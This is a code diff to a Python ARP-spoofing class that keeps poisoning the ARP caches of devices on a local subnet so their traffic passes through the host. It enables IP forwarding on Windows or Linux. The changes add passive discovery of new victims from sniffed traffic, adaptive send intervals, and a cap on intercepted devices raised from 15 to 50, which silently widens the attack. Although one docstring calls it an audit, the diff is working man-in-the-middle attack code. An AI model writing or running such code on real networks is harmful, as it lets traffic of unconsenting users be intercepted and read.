@@ -53,10 +53,11 @@ class ArpSpoofer:
         self._start_time: float = 0.0
         self._packets_sent: int = 0
         self._forwarding_was_enabled: bool = False
+        self._interface_index: int = 0  # Windows interface index for scoped forwarding
 
         # Sniffer integration
         self._sniffer = None  # Reference to PassiveSniffer for auto-start & tagging
-        self._auto_refresh_interval: int = 60  # Re-scan for new devices every N seconds
+        self._auto_refresh_interval: int = 45  # Re-scan for new devices every N seconds
         self._last_refresh: float = 0.0
 
         # Register atexit cleanup
@@ -354,6 +355,15 @@ class ArpSpoofer:
         print(f"[MITM] STOPPED — ARP tables restored for {target_count} targets")
         return result
 
+    def _get_spoof_interval(self, target_count: int) -> float:
+        """Adaptive ARP send interval based on target count to prevent Wi-Fi congestion."""
+        if target_count <= 5:
+            return 2.0
+        elif target_count <= 15:
+            return 4.0
+        else:
+            return 6.0
+
     def _spoof_loop(self) -> None:
         """Background thread: continuously send spoofed ARP replies."""
         s = None
@@ -365,10 +375,13 @@ class ArpSpoofer:
             s = conf.L2socket(iface=self._interface)
 
             self._last_refresh = time.time()
+            last_passive_check = time.time()
 
             while self._running:
                 with self._lock:
                     targets = dict(self._targets)
+
+                target_count = len(targets)
 
                 # Notify sniffer of currently intercepted IPs
                 if self._sniffer:
@@ -376,6 +389,9 @@ class ArpSpoofer:
                         self._sniffer.set_intercepted_ips(set(targets.keys()))
                     except Exception:
                         pass
+
+                # Adaptive micro-sleep: tighter for few targets, more spread for many
+                micro_sleep = max(0.005, 0.05 / max(target_count, 1))
 
                 for target_ip, target_mac in targets.items():
                     if not self._running:
@@ -400,19 +416,27 @@ class ArpSpoofer:
                         with self._lock:
                             self._packets_sent += 1
 
-                        # Micro-sleep between targets to prevent Wi-Fi channel burst congestion
-                        time.sleep(0.01)
+                        # Adaptive micro-sleep between targets to prevent Wi-Fi channel burst congestion
+                        time.sleep(micro_sleep)
 
                     except Exception as e:
                         print(f"[MITM] Spoof error for {target_ip}: {e}")
 
-                # Auto-refresh: periodically scan for new devices
-                if time.time() - self._last_refresh > self._auto_refresh_interval:
-                    self._refresh_targets()
-                    self._last_refresh = time.time()
+                # Passive device discovery: check sniffer traffic for new local IPs
+                now = time.time()
+                if now - last_passive_check > 15 and self._sniffer:
+                    self._passive_discover_new_targets()
+                    last_passive_check = now
 
-                # Send every 3 seconds to maintain poisoned state without overwhelming the network
-                for _ in range(30):  # 3 seconds in 0.1s increments
+                # Auto-refresh: periodically ARP scan for new devices
+                if now - self._last_refresh > self._auto_refresh_interval:
+                    self._refresh_targets()
+                    self._last_refresh = now
+
+                # Adaptive interval to maintain poisoned state without overwhelming the network
+                interval = self._get_spoof_interval(target_count)
+                steps = int(interval / 0.1)
+                for _ in range(steps):
                     if not self._running:
                         break
                     time.sleep(0.1)
@@ -435,8 +459,72 @@ class ArpSpoofer:
                 except Exception:
                     pass
 
+    def _passive_discover_new_targets(self) -> None:
+        """Check sniffer traffic data for new local LAN IPs not yet in targets."""
+        try:
+            if not self._sniffer:
+                return
+
+            # Get unique hosts seen by the sniffer
+            sniffer_hosts = set()
+            try:
+                sniffer_hosts = set(self._sniffer._unique_hosts)
+            except Exception:
+                return
+
+            new_count = 0
+            with self._lock:
+                for ip in sniffer_hosts:
+                    if not ip or ip == self._local_ip or ip == self._gateway_ip:
+                        continue
+                    if ip in self._targets:
+                        continue
+                    if len(self._targets) >= 50:
+                        break
+
+                    # Only consider private IPs
+                    try:
+                        ip_obj = ipaddress.IPv4Address(ip)
+                        if not ip_obj.is_private or ip_obj.is_loopback or ip_obj.is_multicast:
+                            continue
+                    except Exception:
+                        continue
+
+                    # Try to get MAC from sniffer's ip_to_mac mapping
+                    mac = ""
+                    try:
+                        mac = self._sniffer._ip_to_mac.get(ip, "")
+                    except Exception:
+                        pass
+
+                    if not mac:
+                        # Check discovered hosts
+                        for h in self._discovered_hosts:
+                            if h["ip"] == ip:
+                                mac = h["mac"]
+                                break
+
+                    if not mac:
+                        # Quick ARP resolve (outside lock would be better, but keep it simple)
+                        continue  # Will be picked up by _refresh_targets broadcast
+
+                    self._targets[ip] = mac
+                    new_count += 1
+
+                    # Also add to discovered hosts
+                    if not any(h["ip"] == ip for h in self._discovered_hosts):
+                        self._discovered_hosts.append({
+                            "ip": ip, "mac": mac, "hostname": "", "is_gateway": False
+                        })
+
+            if new_count > 0:
+                print(f"[MITM] Passive discovery: added {new_count} new device(s) from sniffer traffic")
+
+        except Exception as e:
+            print(f"[MITM] Passive discovery error: {e}")
+
     def _refresh_targets(self) -> None:
-        """Re-scan the subnet and add newly discovered devices up to a safe concurrency cap."""
+        """Re-scan the subnet and add newly discovered devices."""
         try:
             from scapy.all import ARP, Ether, srp, conf
             conf.verb = 0
@@ -444,7 +532,7 @@ class ArpSpoofer:
             if not self._interface or not self._local_ip:
                 return
 
-            # Quick ARP sweep
+            # Build subnet CIDR
             subnet_cidr = f"{self._local_ip}/24"
             try:
                 import psutil
@@ -458,8 +546,9 @@ class ArpSpoofer:
             except Exception:
                 pass
 
+            # Lighter scan: reduced timeout, no retries
             arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=subnet_cidr)
-            answered, _ = srp(arp_request, iface=self._interface, timeout=2, retry=0, verbose=False)
+            answered, _ = srp(arp_request, iface=self._interface, timeout=1, retry=0, verbose=False)
 
             new_count = 0
             with self._lock:
@@ -477,10 +566,14 @@ class ArpSpoofer:
                             "ip": ip, "mac": mac, "hostname": "", "is_gateway": False
                         })
 
-                    # Add to active interception if under safe concurrency cap (max 15 devices)
-                    if ip not in self._targets and len(self._targets) < 15:
+                    # Add to active interception (cap at 50 devices)
+                    if ip not in self._targets and len(self._targets) < 50:
                         self._targets[ip] = mac
                         new_count += 1
+                    elif ip in self._targets:
+                        # Update MAC if it changed (device got new DHCP lease)
+                        if self._targets[ip] != mac:
+                            self._targets[ip] = mac
 
             if new_count > 0:
                 print(f"[MITM] Auto-refresh: added {new_count} new device(s) to interception")
@@ -522,8 +615,24 @@ class ArpSpoofer:
         except Exception as e:
             print(f"[MITM] ARP restore error: {e}")
 
+    def _get_interface_index(self) -> int:
+        """Get the Windows interface index for the active interface."""
+        try:
+            if self._local_ip:
+                result = subprocess.run(
+                    ["powershell", "-Command",
+                     f"(Get-NetIPAddress -IPAddress '{self._local_ip}' -ErrorAction SilentlyContinue).InterfaceIndex"],
+                    capture_output=True, text=True, timeout=10,
+                )
+                idx = result.stdout.strip()
+                if idx and idx.isdigit():
+                    return int(idx)
+        except Exception:
+            pass
+        return 0
+
     def _enable_ip_forwarding(self) -> None:
-        """Enable IP forwarding on Windows so intercepted packets get relayed."""
+        """Enable IP forwarding scoped to the audit interface only."""
         try:
             if platform.system() != "Windows":
                 # Linux
@@ -535,38 +644,57 @@ class ArpSpoofer:
                 print("[MITM] IP forwarding enabled (Linux)")
                 return
 
-            # Windows — check current state
-            result = subprocess.run(
-                ["netsh", "interface", "ipv4", "show", "global"],
-                capture_output=True, text=True, timeout=10,
-            )
-            self._forwarding_was_enabled = "forwarding" in result.stdout.lower() and "enabled" in result.stdout.lower()
+            # Windows — get interface index for scoped forwarding
+            self._interface_index = self._get_interface_index()
 
-            # Enable IP routing and disable ICMP redirects in registry
-            # Suppressing ICMP redirects prevents Windows from flooding targets with
-            # redirect packets when forwarding across the same adapter interface.
+            # Check current forwarding state on the specific interface
+            self._forwarding_was_enabled = False
+            if self._interface_index:
+                result = subprocess.run(
+                    ["netsh", "interface", "ipv4", "show", "interface", str(self._interface_index)],
+                    capture_output=True, text=True, timeout=10,
+                )
+                self._forwarding_was_enabled = "forwarding" in result.stdout.lower() and "enabled" in result.stdout.lower()
+
+            # Enable IP routing in registry (needed for Windows to forward at all)
             subprocess.run(
                 ["reg", "add", r"HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters",
                  "/v", "IPEnableRouting", "/t", "REG_DWORD", "/d", "1", "/f"],
                 capture_output=True, timeout=10,
             )
+            # Suppress ICMP redirects — prevents Windows from flooding targets with
+            # redirect packets when forwarding across the same adapter interface.
             subprocess.run(
                 ["reg", "add", r"HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters",
                  "/v", "EnableICMPRedirect", "/t", "REG_DWORD", "/d", "0", "/f"],
                 capture_output=True, timeout=10,
             )
 
-            # Also via netsh
-            subprocess.run(
-                ["netsh", "interface", "ipv4", "set", "global", "forwarding=enabled"],
-                capture_output=True, timeout=10,
-            )
-            subprocess.run(
-                ["netsh", "interface", "ipv4", "set", "global", "icmpredirects=disabled"],
-                capture_output=True, timeout=10,
-            )
-
-            print("[MITM] IP forwarding enabled, ICMP redirects suppressed (Windows)")
+            # Enable forwarding ONLY on the specific audit interface (not globally)
+            if self._interface_index:
+                subprocess.run(
+                    ["netsh", "interface", "ipv4", "set", "interface",
+                     str(self._interface_index), "forwarding=enabled"],
+                    capture_output=True, timeout=10,
+                )
+                # Also suppress ICMP redirects on this interface
+                subprocess.run(
+                    ["netsh", "interface", "ipv4", "set", "interface",
+                     str(self._interface_index), "icmpredirects=disabled"],
+                    capture_output=True, timeout=10,
+                )
+                print(f"[MITM] IP forwarding enabled on interface #{self._interface_index} only, ICMP redirects suppressed")
+            else:
+                # Fallback to global if we couldn't detect the interface index
+                subprocess.run(
+                    ["netsh", "interface", "ipv4", "set", "global", "forwarding=enabled"],
+                    capture_output=True, timeout=10,
+                )
+                subprocess.run(
+                    ["netsh", "interface", "ipv4", "set", "global", "icmpredirects=disabled"],
+                    capture_output=True, timeout=10,
+                )
+                print("[MITM] IP forwarding enabled globally (fallback), ICMP redirects suppressed")
 
         except Exception as e:
             print(f"[MITM] Warning: could not enable IP forwarding ({e})")
@@ -584,6 +712,7 @@ class ArpSpoofer:
                 print("[MITM] IP forwarding disabled (Linux)")
                 return
 
+            # Restore registry
             subprocess.run(
                 ["reg", "add", r"HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters",
                  "/v", "IPEnableRouting", "/t", "REG_DWORD", "/d", "0", "/f"],
@@ -594,15 +723,31 @@ class ArpSpoofer:
                  "/v", "EnableICMPRedirect", "/t", "REG_DWORD", "/d", "1", "/f"],
                 capture_output=True, timeout=10,
             )
-            subprocess.run(
-                ["netsh", "interface", "ipv4", "set", "global", "forwarding=disabled"],
-                capture_output=True, timeout=10,
-            )
-            subprocess.run(
-                ["netsh", "interface", "ipv4", "set", "global", "icmpredirects=enabled"],
-                capture_output=True, timeout=10,
-            )
-            print("[MITM] IP forwarding disabled (Windows)")
+
+            # Disable forwarding on the specific interface we enabled it on
+            if self._interface_index:
+                subprocess.run(
+                    ["netsh", "interface", "ipv4", "set", "interface",
+                     str(self._interface_index), "forwarding=disabled"],
+                    capture_output=True, timeout=10,
+                )
+                subprocess.run(
+                    ["netsh", "interface", "ipv4", "set", "interface",
+                     str(self._interface_index), "icmpredirects=enabled"],
+                    capture_output=True, timeout=10,
+                )
+                print(f"[MITM] IP forwarding disabled on interface #{self._interface_index}")
+            else:
+                # Fallback to global
+                subprocess.run(
+                    ["netsh", "interface", "ipv4", "set", "global", "forwarding=disabled"],
+                    capture_output=True, timeout=10,
+                )
+                subprocess.run(
+                    ["netsh", "interface", "ipv4", "set", "global", "icmpredirects=enabled"],
+                    capture_output=True, timeout=10,
+                )
+                print("[MITM] IP forwarding disabled globally")
 
         except Exception as e:
             print(f"[MITM] Warning: could not disable IP forwarding ({e})")
